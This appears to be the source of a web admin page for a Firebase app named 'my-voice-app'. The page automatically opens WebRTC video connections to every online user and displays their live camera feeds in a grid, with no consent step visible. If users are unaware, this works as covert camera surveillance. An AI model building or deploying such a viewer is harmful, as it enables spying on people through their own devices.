<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Live Feeds</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body { font-family: 'Inter', sans-serif; }
        .video-card {
            transition: all 0.3s ease-in-out;
        }
    </style>
</head>
<body class="bg-gray-900 text-white min-h-screen p-4">

    <div class="container mx-auto">
        <h1 class="text-3xl font-bold text-center mb-2">Live Camera Feeds</h1>
        <p class="text-center text-gray-400 mb-6">Online Users: <span id="userCount">0</span></p>

        <!-- Video Grid -->
        <div id="video-grid" class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
            <!-- Live feeds will be populated here -->
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.9.0/firebase-app.js";
        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.9.0/firebase-auth.js";
        import { getFirestore, doc, onSnapshot, setDoc, updateDoc, deleteDoc } from "https://www.gstatic.com/firebasejs/11.9.0/firebase-firestore.js";
        import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/11.9.0/firebase-database.js";

        // --- Firebase Configuration ---
        const firebaseConfig = {
            apiKey: "AIzaSyCwzPmWpDmx4SEPeZkvzcYLnOd4k6QLe2U",
            authDomain: "my-voice-app-4eca5.firebaseapp.com",
            projectId: "my-voice-app-4eca5",
            storageBucket: "my-voice-app-4eca5.appspot.com",
            messagingSenderId: "972654270500",
            appId: "1:972654270500:web:c29a42a09972f5a4ce20b1",
            databaseURL: "https://my-voice-app-4eca5-default-rtdb.asia-southeast1.firebasedatabase.app"
        };

        // --- DOM Elements ---
        const videoGridEl = document.getElementById('video-grid');
        const userCountEl = document.getElementById('userCount');
        
        // --- App State ---
        let db, rtdb;
        let peerConnections = {}; // Will now store { pc, unsubscribe }

        // --- Main Initialization ---
        async function initialize() {
            try {
                const app = initializeApp(firebaseConfig);
                db = getFirestore(app);
                const auth = getAuth(app);
                rtdb = getDatabase(app);
                await signInAnonymously(auth);

                console.log("Admin Panel Initialized. Listening for users...");
                listenToUsers();
            } catch (e) {
                console.error("Initialization failed:", e);
                alert("Could not connect to Firebase. Check console for errors.");
            }
        }

        function listenToUsers() {
            const statusRef = ref(rtdb, 'status/');
            onValue(statusRef, (snapshot) => {
                const users = snapshot.val() || {};
                const onlineUsers = new Set();
                
                for (const userId in users) {
                    if (users[userId].state === 'online') {
                        onlineUsers.add(userId);
                    }
                }
                userCountEl.textContent = onlineUsers.size;

                // Naye users ke liye connection banayein
                onlineUsers.forEach(userId => {
                    if (!peerConnections[userId]) {
                        connectToUser(userId);
                    }
                });

                // Offline users ka connection saaf karein
                Object.keys(peerConnections).forEach(userId => {
                    if (!onlineUsers.has(userId)) {
                        disconnectFromUser(userId);
                    }
                });
            });
        }
        
        function addUserVideoUI(userId) {
            if (document.getElementById(`video_card_${userId}`)) return;

            const videoCard = document.createElement('div');
            videoCard.id = `video_card_${userId}`;
            videoCard.className = 'video-card bg-slate-800 rounded-lg overflow-hidden shadow-lg';
            videoCard.innerHTML = `
                <video id="video_${userId}" autoplay playsinline class="w-full h-auto aspect-video bg-black"></video>
                <div class="p-2">
                    <p class="text-sm font-semibold">User-${userId.substring(0, 6)}</p>
                </div>
            `;
            videoGridEl.appendChild(videoCard);
        }
        
        function removeUserVideoUI(userId) {
            const videoCard = document.getElementById(`video_card_${userId}`);
            if (videoCard) videoCard.remove();
        }

        async function connectToUser(userId) {
            addUserVideoUI(userId);
            const pc = new RTCPeerConnection();
            
            pc.ontrack = (event) => {
                const videoEl = document.getElementById(`video_${userId}`);
                if (videoEl) {
                    videoEl.srcObject = event.streams[0];
                }
            };
            
            pc.onconnectionstatechange = () => {
                if (['disconnected', 'failed', 'closed'].includes(pc.connectionState)) {
                    disconnectFromUser(userId);
                }
            };

            const offer = await pc.createOffer({ offerToReceiveVideo: 1 });
            await pc.setLocalDescription(offer);

            const offerRef = doc(db, 'webrtc_calls', userId);
            await setDoc(offerRef, { offer });

            const unsubscribe = onSnapshot(offerRef, (snapshot) => {
                // ** FIX: Check if the connection is already closed before processing the signal **
                if (pc.signalingState === 'closed') {
                    return; 
                }
                const data = snapshot.data();
                if (data && data.answer && pc.signalingState === 'have-local-offer') {
                    pc.setRemoteDescription(new RTCSessionDescription(data.answer));
                }
            });

            // Store both the connection and its listener's unsubscribe function
            peerConnections[userId] = { pc, unsubscribe };
        }
        
        function disconnectFromUser(userId) {
            if (peerConnections[userId]) {
                // ** FIX: Detach the Firestore listener before closing the connection **
                peerConnections[userId].unsubscribe();
                peerConnections[userId].pc.close();
                delete peerConnections[userId];
            }
            removeUserVideoUI(userId);
            deleteDoc(doc(db, 'webrtc_calls', userId));
        }

        initialize();
    </script>
</body>
</html>
